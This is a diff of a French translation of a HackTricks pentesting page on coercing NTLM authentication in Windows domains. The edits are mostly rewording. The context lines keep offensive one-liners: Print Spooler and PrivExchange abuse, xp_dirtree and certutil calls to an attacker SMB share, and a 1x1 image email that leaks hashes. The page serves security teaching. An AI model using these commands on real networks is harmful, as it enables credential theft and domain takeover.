@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
@@ -18,12 +18,12 @@
 
 ## Abus du service Spouleur
 
-Si le service _**Spouleur d'impression**_ est **activé**, vous pouvez utiliser des informations d'identification AD déjà connues pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d'impression et lui dire de **envoyer la notification à un système**.\
+Si le service _**Spouleur d'impression**_ est **activé**, vous pouvez utiliser des informations d'identification AD déjà connues pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d'impression et lui dire simplement de **envoyer la notification à un système**.\
 Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit s'**authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Spouleur d'impression**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte de l'ordinateur** dans cette authentification.
 
-### Trouver les serveurs Windows sur le domaine
+### Recherche de serveurs Windows sur le domaine
 
-En utilisant PowerShell, obtenez une liste des machines Windows. Les serveurs sont généralement prioritaires, alors concentrons-nous là-dessus:
+En utilisant PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement prioritaires, alors concentrons-nous là-dessus:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -61,7 +61,7 @@ Si un attaquant a déjà compromis un ordinateur avec la [Délégation sans cont
 
 L'attaque `PrivExchange` est le résultat d'une faille trouvée dans la fonctionnalité **PushSubscription du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par n'importe quel utilisateur de domaine avec une boîte aux lettres de s'authentifier sur n'importe quel hôte fourni par le client via HTTP.
 
-Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a **des privilèges WriteDacl sur la pré-mise à jour cumulative de 2019**). Cette faille peut être exploitée pour permettre le **relais d'informations vers LDAP et extraire ensuite la base de données NTDS du domaine**. Dans les cas où le relais vers LDAP n'est pas possible, cette faille peut toujours être utilisée pour relayer et s'authentifier sur d'autres hôtes dans le domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'administrateur de domaine avec n'importe quel compte utilisateur de domaine authentifié.
+Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a **des privilèges WriteDacl sur la pré-mise à jour cumulative 2019 du domaine**). Cette faille peut être exploitée pour permettre le **relais d'informations vers LDAP et extraire ensuite la base de données NTDS du domaine**. Dans les cas où le relais vers LDAP n'est pas possible, cette faille peut toujours être utilisée pour relayer et s'authentifier sur d'autres hôtes dans le domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'administrateur de domaine avec n'importe quel compte utilisateur de domaine authentifié.
 
 ## À l'intérieur de Windows
 
@@ -75,11 +75,11 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Ou utilisez cette autre technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-Il est possible d'utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour forcer l'authentification NTLM :
+Il est possible d'utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour forcer l'authentification NTLM:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -87,7 +87,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Si vous connaissez l'**adresse e-mail** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **e-mail avec une image de 1x1** comme suit:
+Si vous connaissez l'**adresse e-mail** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **e-mail avec une image de 1x1 pixel** comme suit:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -101,5 +101,5 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ```
 ## Casser NTLMv1
 
-Si vous parvenez à capturer des défis NTLMv1, lisez ici comment les casser.\
+Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les casser](../ntlm/#ntlmv1-attack).\
 _Rappelez-vous que pour casser NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
